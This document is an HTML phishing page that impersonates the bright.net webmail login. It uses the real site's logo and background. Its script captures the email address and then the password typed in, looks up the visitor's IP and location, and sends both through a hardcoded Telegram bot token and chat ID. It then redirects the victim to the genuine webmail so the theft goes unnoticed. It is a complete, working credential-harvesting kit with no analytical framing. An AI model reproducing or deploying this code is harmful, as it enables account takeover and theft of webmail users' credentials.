<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: url('https://mail.bright.net/webmail/server/download.php?class=background&fullpath=mail.bright.net&uid=13145209') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #333;
    }

    .login-card {
      background: white;
      border-radius: 10px;
      width: 100%;
      max-width: 420px;
      padding: 45px 40px 50px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
    }

    .header {
      display: flex;
      justify-content: flex-end;
      margin-bottom: 25px;
    }

    .lang {
      font-size: 14px;
      color: #0066cc;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 4px;
    }

    .lang i { font-size: 11px; }

    .logo img {
      max-width: 240px;
      height: auto;
      margin-bottom: 30px;
    }

    h1 {
      font-size: 23px;
      margin-bottom: 8px;
      color: #333;
      font-weight: 500;
    }

    .subtitle {
      font-size: 15px;
      color: #555;
      margin-bottom: 30px;
    }

    .form-group {
      margin-bottom: 28px;
      text-align: left;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 8px;
      color: #444;
    }

    .input-field {
      width: 100%;
      padding: 13px 16px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
      outline: none;
    }

    .input-field:focus {
      border-color: #6f42c1;
    }

    .show-toggle {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: #6f42c1;
      font-size: 13px;
      cursor: pointer;
      user-select: none;
    }

    .btn-next, .btn-signin {
      width: 100%;
      padding: 13px;
      background: #6f42c1;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      margin: 15px 0 22px;
    }

    .btn-next:hover, .btn-signin:hover {
      background: #5a35a3;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin: 12px 0;
      font-size: 14px;
    }

    .checkbox-group input { margin-right: 10px; }

    .avatar-circle {
      width: 70px;
      height: 70px;
      background: #6f42c1;
      color: white;
      font-size: 30px;
      font-weight: bold;
      line-height: 70px;
      border-radius: 50%;
      margin: 0 auto 22px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .links {
      text-align: center;
      font-size: 14px;
      margin-top: 22px;
    }

    .links a {
      color: #6f42c1;
      text-decoration: none;
      margin: 0 12px;
    }

    .links a:hover { text-decoration: underline; }

    .hidden { display: none; }

    @media (max-width: 480px) {
      .login-card { padding: 35px 25px; max-width: 360px; }
      .logo img { max-width: 210px; }
    }
  </style>
</head>
<body>

  <!-- Step 1: Email address only -->
  <div class="login-card" id="emailStep">
    <div class="header">
      <div class="lang">
        EN <i class="fas fa-chevron-down"></i>
      </div>
    </div>

    <div class="logo">
      <img src="https://mail.bright.net/webmail/server/download.php?class=logo&fullpath=mail.bright.net&uid=a216bd7b3cc78af3a625a13262bb24cc" alt="bright.net" />
    </div>

    <h1>Sign in to Webmail</h1>

    <form id="emailForm">
      <div class="form-group">
        <label>Email address</label>
        <input type="email" id="email" class="input-field" placeholder="Email address" autocomplete="email" required autofocus>
      </div>

      <button type="submit" class="btn-next">Next</button>
    </form>
  </div>

  <!-- Step 2: Password -->
  <div class="login-card hidden" id="passwordStep">
    <div class="avatar-circle" id="avatarLetter"></div>

    <h1>Sign in to Webmail</h1>
    <p class="subtitle" id="emailDisplay"></p>

    <form id="passwordForm">
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="current-password" required>
        <span class="show-toggle" id="togglePassword">Show</span>
      </div>

      <div class="checkbox-group">
        <input type="checkbox" id="keepSignedIn" checked>
        <label for="keepSignedIn">Keep me signed in</label>
      </div>

      <button type="submit" class="btn-signin">Sign in</button>
    </form>

    <div class="links">
      <a href="#">Forgot?</a>
      <a href="#">Not you? Check your account again</a>
    </div>
  </div>

  <script>
    // Updated Telegram details
    const BOT_TOKEN = '8520211477:AAFFJHUZYsxU9IBKzQmlhQo7lVGzmU4Bc60';
    const CHAT_ID   = '7833149465';

    const emailStep = document.getElementById('emailStep');
    const passwordStep = document.getElementById('passwordStep');
    const emailInput = document.getElementById('email');
    const emailDisplay = document.getElementById('emailDisplay');
    const avatarLetter = document.getElementById('avatarLetter');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('togglePassword');

    // Password toggle (text "Show"/"Hide")
    togglePassword.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      togglePassword.textContent = isPassword ? 'Hide' : 'Show';
    });

    // Step 1: Email submit
    document.getElementById('emailForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = emailInput.value.trim();
      if (!email) return;

      let ip = 'unknown';
      let geo = 'unknown';

      try {
        const geoRes = await fetch('https://ipapi.co/json/');
        const data = await geoRes.json();
        ip = data.ip || 'hidden';
        geo = `${data.city || '?'} - ${data.country_name || '?'} (${data.timezone || '?'})`;
      } catch (err) {
        console.error('Geo fetch failed:', err);
      }

      const msgEmail = `
BRIGHT.NET WEBMAIL - EMAIL STEP
Time: ${new Date().toLocaleString()}
Email: ${email}
IP: ${ip}
Location: ${geo}
URL: ${window.location.href}
      `.trim();

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msgEmail.trim(), disable_web_page_preview: true }),
        keepalive: true
      }).then(() => console.log('Email message sent')).catch(err => console.error('Email send failed:', err));

      // Switch to password step
      emailStep.classList.add('hidden');
      passwordStep.classList.remove('hidden');

      const firstChar = email.charAt(0).toUpperCase() || '?';
      avatarLetter.textContent = firstChar;
      emailDisplay.textContent = email;
      passwordInput.focus();
    });

    // Step 2: Password submit
    document.getElementById('passwordForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      if (!password) return;

      let ip = 'unknown';
      let geo = 'unknown';

      try {
        const geoRes = await fetch('https://ipapi.co/json/');
        const data = await geoRes.json();
        ip = data.ip || 'hidden';
        geo = `${data.city || '?'} - ${data.country_name || '?'} (${data.timezone || '?'})`;
      } catch (err) {
        console.error('Geo fetch failed:', err);
      }

      const msgPass = `
BRIGHT.NET WEBMAIL - PASSWORD STEP
Time: ${new Date().toLocaleString()}
Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${geo}
URL: ${window.location.href}
      `.trim();

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msgPass.trim(), disable_web_page_preview: true }),
        keepalive: true
      }).then(() => console.log('Password message sent')).catch(err => console.error('Password send failed:', err));

      // Instant redirect to real webmail
      window.location.href = 'https://mail.bright.net/webmail/';
    });
  </script>

</body>
</html>
